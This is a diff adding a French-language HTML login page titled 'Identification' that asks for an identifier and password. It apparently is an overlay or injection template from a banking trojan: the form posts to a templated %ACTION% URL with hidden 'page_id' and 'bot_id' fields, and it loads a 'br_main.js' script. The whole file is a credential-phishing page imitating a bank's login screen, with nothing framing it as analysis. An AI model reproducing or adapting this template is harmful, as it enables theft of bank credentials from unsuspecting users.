@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title></title>
+	<style type='text/css'>
+	* {
+		margin: 0;
+		padding: 0;
+		font-size: 14pt;
+	}
+	
+	body {
+		background-color: #fff;
+	}
+	
+	#header {
+		border-bottom: 1px solid #eee;
+		padding: 10px;
+	}
+	
+	.button1 {
+		font-weight: bold;
+		padding: 20px;
+		width: 100%;
+		
+		color: black;
+		background-color: white;
+		border: 0;
+		border-radius: 5px; 
+	}
+	
+	
+	#body {
+		width: 100%;
+	}
+	#body TD {
+		padding: 10px;
+	}
+	
+	INPUT {
+		border: 0;
+		background-color: transparent;
+		width: 100%;
+	}
+
+	#loginbutton {
+		height: 56px;
+		padding: 0;
+		color: #15466d;
+	}
+	
+	.inp {
+		height: 60px;
+		border-bottom: 1px solid grey;
+		display: inline-block;
+	}
+
+	</style>
+<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+<script type='text/javascript'>
+document.total_steps = 1
+//document.current_step = 1
+//document.error_style = 'border: 1px solid red'
+function reset()
+{
+	$('#field1').val('')
+	$('#field2').val('')
+}
+</script>
+<script src='%DYN_PATH_GENERAL%/br_main.js'></script>
+
+</head>
+
+<body>
+<div id='body'>	
+	<form id='mainform' method='post' action='%ACTION%'>
+		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+		
+	<table border='0' width='100%' style='margin: 0 auto; margin-bottom: 20px' cellpadding=0 cellspacing=0>
+	<tr><td style='padding: 5px; text-align: center; padding-left: 20px; font-size: 20pt; background-color: #e3ebed; color: black; '>
+		<img src='%DYN_PATH%/img/logo.png'  alt=''  /><br />Identification
+</td></tr>
+	</table>
+
+
+	<table border='0'  style='width: 100%; margin: 0 auto' id='step1' cellpadding=0 cellspacing=0>
+		<tr>
+			<td style='text-align: center; width: 100px'><img src='%DYN_PATH%/img/login.png'  alt=''  /></td>
+			<td style='text-align: center'><input class='inp' type='text' id='field1' name='fields[identifiant]' value='' placeholder='Identifiant' /></td></tr>
+		<tr>
+			<td style='text-align: center; width: 100px'><img src='%DYN_PATH%/img/pass.png'  alt=''  /></td>
+			<td style='text-align: center'><input class='inp' type='password' id='field2' name='fields[passe]' value='' placeholder='Mot de passe' /></td></tr>
+	</table>
+
+	<table border='0' width='100%' style='margin: 0 auto; margin-top: 30px'>
+	<tr>
+		<td style='text-align: center'>&nbsp;</td>
+		<td style='text-align: center; width: 200px'>
+			<input class='button' type='button' onclick='reset()' value='ANNULER' />
+		</td>
+		<td style='text-align: center; width: 200px'>
+			<input id='loginbutton' class='button' type='button' onclick='change_step()' value='VALIDER' />
+		</td>
+	</tr>
+	</table>
+	
+	</form>
+</div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
